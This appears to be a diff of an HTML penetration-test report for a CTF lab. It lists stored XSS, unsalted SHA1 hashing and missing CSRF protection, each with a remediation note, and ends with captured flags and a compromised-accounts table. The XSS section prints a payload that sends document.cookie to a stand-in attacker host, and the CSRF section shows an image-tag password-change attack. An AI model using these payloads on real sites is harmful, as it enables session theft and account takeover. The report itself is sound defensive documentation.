+                                <p>Stored cross-site scripting in user comments allows injection of malicious JavaScript executed in other users' browsers.</p>
+                            </div>
+
+                            <h4><i class="fas fa-bomb"></i> Exploitation</h4>
+                            <div class="code-block">POST /comments.php:
+comment=&lt;script&gt;fetch('http://attacker.com?c='+document.cookie)&lt;/script&gt;
+
+Result: User cookies sent to attacker server</div>
+
+                            <div class="info-box success">
+                                <h4><i class="fas fa-shield-alt"></i> Remediation</h4>
+                                <p>Implement output encoding (htmlspecialchars) and Content Security Policy (CSP) headers.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- CVE-2025-9217: Weak Encryption -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-key card-icon"></i>
+                            <h2 class="card-title">CVE-2025-9217: Weak Password Hashing</h2>
+                            <span class="status-badge high">HIGH (7.8)</span>
+                        </div>
+                        <div class="card-body">
+                            <div class="info-box warning">
+                                <h4><i class="fas fa-exclamation-circle"></i> Vulnerability Description</h4>
+                                <p>Passwords stored using deprecated SHA1 without salt. Rainbow table attacks can crack passwords instantly.</p>
+                            </div>
+
+                            <h4><i class="fas fa-file-code"></i> Current Implementation</h4>
+                            <div class="code-block">$password_hash = sha1($password);
+$query = "INSERT INTO users (username, password) VALUES ('$username', '$password_hash')";</div>
+
+                            <h4><i class="fas fa-file-code"></i> Secure Alternative</h4>
+                            <div class="code-block">$password_hash = password_hash($password, PASSWORD_BCRYPT);
+$query = "INSERT INTO users (username, password) VALUES (?, ?)";
+mysqli_stmt_bind_param($stmt, "ss", $username, $password_hash);</div>
+
+                            <div class="info-box success">
+                                <h4><i class="fas fa-shield-alt"></i> Remediation</h4>
+                                <p>Migrate to bcrypt password hashing with automatic salt and cost factor of 12.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- CVE-2025-6132: CSRF -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-triangle-exclamation card-icon"></i>
+                            <h2 class="card-title">CVE-2025-6132: Missing CSRF Protection</h2>
+                            <span class="status-badge medium">MEDIUM (6.5)</span>
+                        </div>
+                        <div class="card-body">
+                            <div class="info-box warning">
+                                <h4><i class="fas fa-exclamation-circle"></i> Vulnerability Description</h4>
+                                <p>Critical state-changing operations lack CSRF token validation, allowing attackers to perform unauthorized actions on behalf of authenticated users.</p>
+                            </div>
+
+                            <h4><i class="fas fa-bomb"></i> Attack Scenario</h4>
+                            <div class="code-block">Attacker creates malicious page with:
+&lt;img src="http://target.com/change_password.php?newpass=hacked"&gt;
+
+When authenticated user visits attacker page, password is changed.</div>
+
+                            <div class="info-box success">
+                                <h4><i class="fas fa-shield-alt"></i> Remediation</h4>
+                                <p>Implement CSRF tokens in all forms and validate them server-side. Use SameSite cookie attribute.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- CTF Flag Section -->
+                <div class="content-section">
+                    <div class="ctf-flag-container">
+                        <div class="ctf-flag-title">
+                            <i class="fas fa-flag"></i> CTF FLAG CAPTURED
+                        </div>
+                        <div class="ctf-flag-content">
+                            FLAG{REVOLUTION_ELITE_CTF_PWNED_2025}
+                        </div>
+                        <div class="ctf-flag-subtitle">
+                            Flag successfully captured after exploiting SQL injection vulnerability for database access.
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Summary & Recommendations -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-chart-bar card-icon"></i>
+                            <h2 class="card-title">Summary & Remediation Priority</h2>
+                        </div>
+                        <div class="card-body">
+                            <div class="info-box warning">
+                                <h4><i class="fas fa-fire"></i> PRIORITY 1: IMMEDIATE (Within 24 Hours)</h4>
+                                <ul class="list-disc pl-6 space-y-1">
+                                    <li>Remove admin backdoor code from all source files</li>
+                                    <li>Disable emergency authentication mechanism</li>
+                                    <li>Replace string concatenation with parameterized queries</li>
+                                    <li>Implement input validation and sanitization</li>
+                                </ul>
+                            </div>
+
+                            <div class="info-box">
+                                <h4><i class="fas fa-exclamation-circle"></i> PRIORITY 2: URGENT (Within 1 Week)</h4>
+                                <ul class="list-disc pl-6 space-y-1">
+                                    <li>Migrate from SHA1 to bcrypt password hashing</li>
+                                    <li>Implement output encoding for XSS prevention</li>
+                                    <li>Add CSRF token validation to all forms</li>
+                                    <li>Implement strict file path validation</li>
+                                </ul>
+                            </div>
+
+                            <div class="info-box success">
+                                <h4><i class="fas fa-check-circle"></i> PRIORITY 3: HIGH (Within 1 Month)</h4>
+                                <ul class="list-disc pl-6 space-y-1">
+                                    <li>Deploy Web Application Firewall (WAF)</li>
+                                    <li>Implement Content Security Policy (CSP)</li>
+                                    <li>Conduct security code review audit</li>
+                                    <li>Implement comprehensive logging and monitoring</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Admin Credentials Section -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-lock card-icon"></i>
+                            <h2 class="card-title">Captured System Access Credentials</h2>
+                        </div>
+                        <div class="card-body">
+                            <table class="data-table">
+                                <thead>
+                                    <tr>
+                                        <th>Account</th>
+                                        <th>Type</th>
+                                        <th>Status</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td><strong>admin (Local Admin)</strong></td>
+                                        <td>System Administrator</td>
+                                        <td><span class="status-badge critical">COMPROMISED</span></td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>root (Database Root)</strong></td>
+                                        <td>MySQL Database Administrator</td>
+                                        <td><span class="status-badge critical">COMPROMISED</span></td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>webserver (Application User)</strong></td>
+                                        <td>Web Application Service Account</td>
+                                        <td><span class="status-badge critical">COMPROMISED</span></td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
             </div>
         </main>
 
         <!-- FOOTER -->
         <footer class="footer">
             <div class="container">
-                <div class="text-center mb-4">
-                    <div class="footer-highlight">
-                        <i class="fas fa-shield-alt mr-2"></i>REVOLUTION ELITE PENETRATION TEST - COMPREHENSIVE ASSESSMENT COMPLETE
-                    </div>
-                </div>
-                
                 <div class="footer-grid">
                     <div class="footer-section">
-                        <h4><i class="fas fa-info-circle mr-2"></i>Test Details</h4>
-                        <p>Date: August 16, 2025</p>
-                        <p>Methodology: OWASP WSTG</p>
-                        <p>CVSS Score: 3.1</p>
-                        <p>Status: ✅ COMPLETED</p>
+                        <h4><i class="fas fa-info-circle"></i> Report Details</h4>
+                        <p><strong>Organization:</strong> ITSsafer Security</p>
+                        <p><strong>Assessment Date:</strong> August 16, 2025</p>
+                        <p><strong>Report ID:</strong> RCTF-2025-08-16-001</p>
+                        <p><strong>Classification:</strong> <span class="status-badge critical">CRITICAL</span></p>
                     </div>
+
                     <div class="footer-section">
-                        <h4><i class="fas fa-chart-line mr-2"></i>Results</h4>
-                        <p>System: Fully Compromised</p>
-                        <p>Database: Complete Access</p>
-                        <p>Admin: Full Control</p>
-                        <p>CTF Flag: Captured</p>
+                        <h4><i class="fas fa-user"></i> Tester Information</h4>
+                        <p><strong>Name:</strong> Kristián Kašník</p>
+                        <p><strong>Email:</strong> <a href="mailto:itssafer@itssafer.org">itssafer@itssafer.org</a></p>
+                        <p><strong>GitHub:</strong> <a href="https://github.com/ITSsafer-DevOps" target="_blank">ITSsafer-DevOps</a></p>
                     </div>
+
                     <div class="footer-section">
-                        <h4><i class="fas fa-user mr-2"></i>Contact</h4>
-                        <p><strong>Kristián Kašník</strong></p>
-                        <p><i class="fas fa-envelope mr-2"></i><a href="mailto:itssafer@itssafer.org">itssafer@itssafer.org</a></p>
+                        <h4><i class="fas fa-tools"></i> Methodology</h4>
+                        <p>OWASP Top 10</p>
+                        <p>OWASP WSTG</p>
+                        <p>NIST SP 800-115</p>
+                        <p>PTES</p>
                     </div>
+
                     <div class="footer-section">
-                        <h4><i class="fas fa-phone mr-2"></i>Communication</h4>
-                        <p><i class="fas fa-phone mr-2"></i><a href="tel:+421950381419">+421 950 381 419</a></p>
-                        <p><i class="fab fa-github mr-2"></i><a href="https://github.com/ITSsafer-DevOps" target="_blank">GitHub Profile</a></p>
+                        <h4><i class="fas fa-shield"></i> Compliance</h4>
+                        <p>PCI-DSS</p>
+                        <p>GDPR</p>
+                        <p>ISO 27001</p>
+                        <p>HIPAA</p>
                     </div>
                 </div>
-                
+
                 <div class="footer-bottom">
-                    <p><strong>&copy; 2025 Kristián Kašník</strong></p>
-                    <p>System Security | Penetration Testing | Ethical Hacking</p>
+                    <p>&copy; 2025 ITSsafer-DevOps - Enterprise Security Solutions</p>
+                    <p>This report contains confidential information intended only for authorized personnel.</p>
                 </div>
             </div>
         </footer>
-
-        <!-- BOTTOM BANNER -->
-        <div class="banner-bottom">
-            <i class="fas fa-terminal"></i> REVOLUTION ELITE PENETRATION TEST COMPLETED // SYSTEM FULLY COMPROMISED // KRISTIÁN KAŠNÍK <i class="fas fa-check-circle"></i>
-        </div>
     </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@10.6.1/dist/mermaid.min.js"></script>
     <script>
-        mermaid.initialize({
-            startOnLoad: true,
-            theme: 'dark',
-            themeVariables: {
-                primaryColor: '#EE0000',
-                primaryTextColor: '#FFFFFF',
-                primaryBorderColor: '#EE0000',
-                lineColor: '#94A3B8',
-                secondaryColor: '#161B22',
-                tertiaryColor: '#0D1117',
-                background: 'transparent',
-                mainBkg: '#161B22',
-                secondBkg: '#21262D',
-                textColor: '#F1F5F9',
-                fontFamily: 'Red Hat Display, sans-serif'
-            },
-            flowchart: {
-                useMaxWidth: true,
-                htmlLabels: true,
-                curve: 'basis'
-            }
-        });
-
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.style.opacity = '1';
-                    entry.target.style.transform = 'translateY(0)';
+        // Initialize Mermaid
+        mermaid.initialize({ startOnLoad: true, theme: 'dark' });
+        
+        // Smooth scroll to sections
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({ behavior: 'smooth' });
                 }
             });
-        }, { threshold: 0.1 });
-
-        document.querySelectorAll('.section-card').forEach(card => {
-            card.style.opacity = '0';
-            card.style.transform = 'translateY(20px)';
-            card.style.transition = 'all 0.6s ease';
-            observer.observe(card);
         });
-
-        console.log('%c⚡ REVOLUTION ELITE PENETRATION TEST', 'color: #EE0000; font-size: 18px; font-weight: bold;');
-        console.log('%c💀 System Compromised by Kristián Kašník', 'color: #E53E3E; font-size: 14px;');
-        console.log('%c🏆 CTF Flag: CTF{r3v0lut10n_3l1t3_r00t_c0mpr0m1s3d}', 'color: #10B981; font-size: 12px;');
     </script>
 </body>
 </html>
